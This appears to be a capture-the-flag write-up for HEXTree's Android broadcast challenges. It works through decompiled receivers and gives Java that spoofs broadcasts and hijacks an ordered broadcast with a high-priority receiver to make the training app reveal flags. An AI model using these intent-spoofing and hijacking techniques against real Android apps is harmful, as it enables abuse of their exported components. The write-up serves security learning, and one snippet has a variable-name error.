+++
date = '2025-07-14T00:55:36+03:00'
draft = false
title = 'HEX Tree Broadcast Challenges'
+++



### Flag 16
#### Code analysis
```xml
<activity
    android:name="io.hextree.attacksurface.activities.Flag16Activity"
    android:exported="false"/>
</activity>
<receiver
     android:name="io.hextree.attacksurface.receivers.Flag16Receiver"
     android:enabled="true"
	 android:exported="true"/>
```

that doesn't look good >:  the activity isn't exported so we cant call it but luckily there is a receiver defined 

Receiver: 
```java
    public static String FlagSecret = "give-flag-16";
    
    public void onReceive(Context context, Intent intent) {
        if (intent.getStringExtra("flag").equals(FlagSecret)) {
            success(context, FlagSecret);
        }
    }
```

So The received broadcast need to have `flag` with value   `give-flag-16` so that the `success` method is called 

#### Solution
```java
Intent intent = new Intent();
intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag16Receiver");
intent.putExtra("flag","give-flag-16");
sendBroadcast(intent);

```

and yes this was a success 

![[hex_16_1.png]]

`HXT{basic-receiver-ds82s}`

### Flag 17
#### Code analysis
```java
    public static String FlagSecret = "give-flag-17";

    public void onReceive(Context context, Intent intent) {
        Log.i("Flag17Receiver.onReceive", Utils.dumpIntent(context, intent));
        if (isOrderedBroadcast()) {
            if (intent.getStringExtra("flag").equals(FlagSecret)) {
                success(context, FlagSecret);
                return;
            }
            Bundle bundle = new Bundle();
            bundle.putBoolean("success", false);
            setResult(0, "Flag 17 Completed", bundle);
        }
    }
```

The setup is like the pervious but we need to send it as ordered broadcast ?

##### Non-ordered vs. Ordered Broadcasts

In non-ordered mode, broadcasts are sent to all interested receivers “at the same time”. This basically means that one receiver can not interfere in any way with what other receivers will do neither can it prevent other receivers from being executed. One example of such broadcast is the [ACTION_BATTERY_LOW](http://developer.android.com/reference/android/content/Intent.html#ACTION_BATTERY_LOW) one.

In ordered mode, broadcasts are sent to each receiver in order (controlled by the [android:priority](http://developer.android.com/guide/topics/manifest/intent-filter-element.html#priority) attribute for the [intent-filter](http://developer.android.com/guide/topics/manifest/intent-filter-element.html) element in the manifest file that is related to your receiver) and one receiver is able to abort the broadcast so that receivers with a lower priority would not receive it (thus never execute). An example of this type of broadcast (and one that will be discussing in this document) is the [ACTION_NEW_OUTGOING_CALL](http://developer.android.com/reference/android/content/Intent.html#ACTION_NEW_OUTGOING_CALL) one.


#### Solution
```java
Intent intent = new Intent();  
intent.putExtra("flag","give-flag-17");  
intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag17Receiver"); 
sendOrderedBroadcast(intent, null);
```

### Flag 18
#### Code analysis
```java
   public static String SECRET_FLAG = "giving-out-flags";
 
   public void onCreate(Bundle bundle) {
        Intent intent = new Intent("io.hextree.broadcast.FREE_FLAG");
        intent.putExtra("flag", this.f.appendLog(this.flag));
        intent.addFlags(8);
        sendOrderedBroadcast(intent, null, new BroadcastReceiver() { 
            @Override // android.content.BroadcastReceiver
            public void onReceive(Context context, Intent intent2) {
                String resultData = getResultData();
                Bundle resultExtras = getResultExtras(false);
                int resultCode = getResultCode();
                Log.i("Flag18Activity.BroadcastReceiver", "resultData " + resultData);
                Log.i("Flag18Activity.BroadcastReceiver", "resultExtras " + resultExtras);
                Log.i("Flag18Activity.BroadcastReceiver", "resultCode " + resultCode);
                if (resultCode != 0) {
                    Utils.showIntentDialog(context, "BroadcastReceiver.onReceive", intent2);
                    Flag18Activity flag18Activity = Flag18Activity.this;
                    flag18Activity.success(flag18Activity);
                }
            }
        }, null, 0, null, null);

```

This activity will send an ordered broadcast with action `"io.hextree.broadcast.FREE_FLAG"` and wait wait for a respond and when it get's the result an integer named `resultCode` is checked if it has non zero value , if true we get our flag  :0

#### Solution
so we need to create a receiver  with right action filter and `setResultCode` either ok or set a number 

```java
BroadcastReceiver hijacker = new BroadcastReceiver() {  
    @Override  
    public void onReceive(Context context, Intent intent) {  
        setResultCode(Activity.RESULT_OK);   
        setResultData("Intercepted!");
    }  
};
IntentFilter filter = new IntentFilter("io.hextree.broadcast.FREE_FLAG");  
filter.setPriority(999); // Make sure you run first if other apps sent broadcasts 
registerReceiver(hijacker, filter, null, null);
```

or just create  a one liner receiver

```java
registerReceiver(hijacker, new IntentFilter("io.hextree.broadcast.FREE_FLAG"));
```

### Flag 19
#### Code analysis
```java
    public void onReceive(Context context, Intent intent) {
        Bundle bundleExtra;
        String action = intent.getAction();
        if (action == null || !action.contains("APPWIDGET_UPDATE") || (bundleExtra = intent.getBundleExtra("appWidgetOptions")) == null) {
            return;
        }
        int i = bundleExtra.getInt("appWidgetMaxHeight", -1);
        int i2 = bundleExtra.getInt("appWidgetMinHeight", -1);
        if (i == 1094795585 && i2 == 322376503) {
            success(context);
        }
    }
```

Here the widget gets an intent from a broadcast and checks if there is an action `APPWIDGET_UPDATE` and is bundled with Extra data : i = `1094795585` & i2 = `322376503`

#### Solution
so we will create a `Bundle` object and supply it with data and set correct action  

```java
Intent intent  = new Intent();  
intent.setComponent(new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag19Widget"  
));  
Bundle bundle = new Bundle();  
options.putInt("appWidgetMaxHeight", 1094795585);  
options.putInt("appWidgetMinHeight", 322376503);  
  
intent.putExtra("appWidgetOptions", bundle);  
intent.setAction("APPWIDGET_UPDATE");  
sendBroadcast(intent);
```

### Flag 20
#### Code analysis
```java
  public static String GET_FLAG = "io.hextree.broadcast.GET_FLAG";
  public void onCreate(Bundle bundle) {
		
		if (intent == null) { return; }
        Intent intent = getIntent();
        String action = intent.getAction();
        if (action != null && action.equals(GET_FLAG)) {
            success(this);
            return;
        }
        Flag20Receiver flag20Receiver = new Flag20Receiver();
        IntentFilter intentFilter = new IntentFilter(GET_FLAG);
        registerReceiver(flag20Receiver, intentFilter);
    }
```

This registers a receiver for action `"io.hextree.broadcast.GET_FLAG"` and upon getting non-empty intent with the action we get our Flag

#### Solution
```java
Intent intent = new Intent();  
intent.setAction("io.hextree.broadcast.GET_FLAG");  
intent.putExtra("give-flag", true);   // any data
sendBroadcast(intent);
```

### Flag 21
#### Code analysis
Notification part:
```java
// Notification channel creation
private void createNotificationChannel() {
	//Notifications need a "channel" (like a TV channel) to appear.
    NotificationChannel notificationChannel = new NotificationChannel(
        "CHANNEL_ID", // Unique ID for the channel
        "Hextree Notifications", // User-visible name
        NotificationManager.IMPORTANCE_DEFAULT // Importance level (affects sound & visibility)
    );
    notificationChannel.setDescription("Notifications related to security features.");
    
    // Actually create the channel
    NotificationManager manager = getSystemService(NotificationManager.class);
    manager.createNotificationChannel(notificationChannel);
}

// In onCreate():
// Create and show notification with action button
createNotificationChannel();

// Prepare the broadcast intent (like preparing a letter to send)
Intent intent = new Intent(GIVE_FLAG);
intent.putExtra("flag", this.f.appendLog(this.flag)); // Attach extra data (the flag)

// Wrap the intent in a PendingIntent (allows background execution)
PendingIntent pendingIntent = PendingIntent.getBroadcast(
    this, 
    0, // Request code (unused here)
    intent, 
    PendingIntent.FLAG_IMMUTABLE // Security flag (required for Android 12+)
);

// Build the notification
NotificationCompat.Builder notification = new NotificationCompat.Builder(this, "CHANNEL_ID")
    .setSmallIcon(R.drawable.hextree_logo) // Small icon in status bar
    .setContentTitle(this.name) // Title of notification
    .setContentText("Reverse engineer classes Flag21Activity") // Description
    .setPriority(NotificationCompat.PRIORITY_DEFAULT) // How prominent it is
    .setAutoCancel(true) // Dismiss when clicked
    .addAction( // Add a button to the notification
        R.drawable.hextree_logo, // Icon for the button
        "Give Flag", // Text on the button
        pendingIntent // What happens when clicked (sends broadcast)
    );

// Check permission and show notification
if (ActivityCompat.checkSelfPermission(this, "android.permission.POST_NOTIFICATIONS") != 0) {
    NotificationManagerCompat.from(this).notify(1, notification.build());
    Toast.makeText(this, "Check your notifications", 0).show();
}
```

The notification has a button that triggers a broadcast when clicked. The broadcast contains a hidden "flag" (likely part of a security challenge). The receiver (Part 2) catches this broadcast and processes it. Android 13+ requires explicit permission for notifications.

Receiver part:
```java
//Flag21Activity.class
	// Broadcast Receiver implementation
private BroadcastReceiver broadcastReceiver = new BroadcastReceiver() {
    @Override
    public void onReceive(Context context, Intent intent) {
        // Get broadcast results
        String resultData = getResultData();
        Bundle resultExtras = getResultExtras(false);
        int resultCode = getResultCode();
        
        // Log the results
        Log.i("Flag18Activity.BroadcastReceiver", "resultData " + resultData);
        Log.i("Flag18Activity.BroadcastReceiver", "resultExtras " + resultExtras);
        Log.i("Flag18Activity.BroadcastReceiver", "resultCode " + resultCode);
        
        // Show toast and handle success
        Toast.makeText(context, "Check the broadcast intent for the flag", 0).show();
        Flag21Activity flag21Activity = Flag21Activity.this;
        flag21Activity.success(null, flag21Activity);
    }
};

// In onCreate():
// Register the broadcast receiver
this.f.addTag(GIVE_FLAG);
IntentFilter intentFilter = new IntentFilter(GIVE_FLAG);
registerReceiver(broadcastReceiver, intentFilter);

```

The receiver waits for a broadcast with the action `GIVE_FLAG`.  When received, it logs the data and shows a Toast then The `success()` method is called.

#### Solution
after clicking on activity to create the notification mimicked what the button in notification should send just do the trick 
```java
Intent intent = new Intent();  
intent.setAction("io.hextree.broadcast.GIVE_FLAG");  
sendBroadcast(intent);
```

![[hex_21_1.png]]